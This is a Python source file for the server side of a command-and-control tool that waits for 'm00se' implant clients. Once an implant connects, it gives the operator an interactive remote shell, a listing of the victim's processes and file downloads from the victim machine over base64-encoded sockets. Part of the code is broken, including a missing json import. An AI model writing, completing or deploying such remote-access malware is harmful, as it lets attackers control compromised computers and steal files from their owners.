import socket
import base64
import rsa
import sys


class C2_Server():

    def __init__(self):
        self.host = "127.0.0.1"
        self.port = 5555
        self.private_key = rsa.PrivateKey.load_pkcs1(open("./private.key", "r").read())
        self.public_key =  rsa.PublicKey.load_pkcs1_openssl_pem(open("./public.key", "rb").read())
        self.connected = False
        self.shell = False

    def start(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind((self.host, self.port))
        self.socket.listen()
        print('Listening for m00se clients on', self.host, self.port)

    def connect(self):
        self.conn, self.addr = self.socket.accept()
        self.connected = True
        print('Connected by', self.addr)

    def receive_message(self):
        chunks = list()

        data = self.conn.recv(4096)

        # dec_msg = rsa.decrypt(data, self.private_key).decode()
        msg = base64.b64decode(data)
        return msg.decode()
        # if not data:
        #     break
        # conn.sendall(data)
        # self.socket.close()

    def send_message(self, msg):
        if self.connected:
            if isinstance(msg, dict):
                encoded_msg = base64.b64encode(json.dumps(msg).encode('utf-8'))
            else:
                encoded_msg = base64.b64encode(str(msg).encode('utf-8'))
            # encrypted_message = rsa.encrypt(encoded_msg,
            #              self.public_key)
            self.conn.send(encoded_msg)
            # data = self.socket.recv(1024)
            # print(data)

    def input_command(self):
        msg = input('{} >> '.format(self.addr[0]))
        if msg == 'exit' or msg == 'quit':
            self.socket.close()
            sys.exit()


        elif msg == 'shell':
            self.send_message(msg)
            response = self.receive_message()
            if response.startswith("Shell spawned"):
                self.shell = True
                self.shell_path = response.split('*-*')[1]
                while self.shell:
                    msg = input("{} > ".format(self.shell_path))
                    self.send_message(msg)
                    response = self.receive_message()
                    if "*-*" in response:
                        self.shell_path = response.split('*-*')[1]
                    else:
                        try:
                            print(response.decode())
                        except:
                            print(response)
                    if response == "Shell exited":
                        print('Exiting shell!')
                        self.shell = False
                        self.input_command()
        elif msg.startswith("processes"):
            self.send_message(msg)
            while True:
                proc = self.conn.recv(1024)
                if base64.b64decode(proc).decode() == "END":
                    break

                print(base64.b64decode(proc).decode())
            self.input_command()

        elif msg.startswith("download"):
            file = msg.split(' ')[1]
            self.send_message(msg)
            with open(file, 'wb') as f:
                while True:
                    data = self.conn.recv(1024)

                    if base64.b64decode(data).decode() == "END":
                        break
                    else:
                        f.write(base64.b64decode(data))
            self.input_command()

        else:
            if msg:
                self.send_message(msg)







if __name__ == '__main__':
    c2 = C2_Server()
    c2.start()
    c2.connect()
    while True:
        c2.input_command()
        c2.receive_message()
